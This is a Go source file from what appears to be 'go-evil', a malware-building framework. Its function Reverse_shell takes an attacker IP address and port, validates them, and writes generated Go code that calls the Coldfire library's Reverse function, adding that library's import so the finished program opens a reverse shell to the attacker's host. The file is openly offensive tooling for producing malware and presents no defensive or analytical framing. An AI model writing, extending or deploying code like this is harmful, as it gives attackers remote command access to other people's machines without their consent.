package network

import (
	"fmt"

	"github.com/s9rA16Bf4/go-evil/utility/structure"
	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
	"github.com/s9rA16Bf4/go-evil/utility/tools"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

// Creates a reverse shell
// Input, evil array, format ${"attacker ip", "attacker port"}$
func Reverse_shell(value string, data_object *json.Json_t) []string {
	function_call := "reverse_shell"

	arr := structure.Create_evil_object(value)

	if arr.Length() != 2 {
		notify.Error(fmt.Sprintf("Expected two values, but recieved %d", arr.Length()), "network.reverse_shell()")
	}

	ip := arr.Get(0)
	port := arr.Get(1)

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{"repr_1 []int", "repr_2 int"},
		Gut: []string{
			"param_1 := spine.variable.get(spine.alpha.construct_string(repr_1))",
			"coldfire.Reverse(param_1, repr_2)",
		}})

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	i_port := tools.String_to_int(port)
	if i_port == -1 {
		notify.Error(fmt.Sprintf("Failed to convert '%s' to an integer", port), "network.reverse_shell()")
	}

	parameter_1 := data_object.Generate_int_array_parameter(ip)

	return []string{fmt.Sprintf("%s(%s, %d)", function_call, parameter_1, i_port)}
}
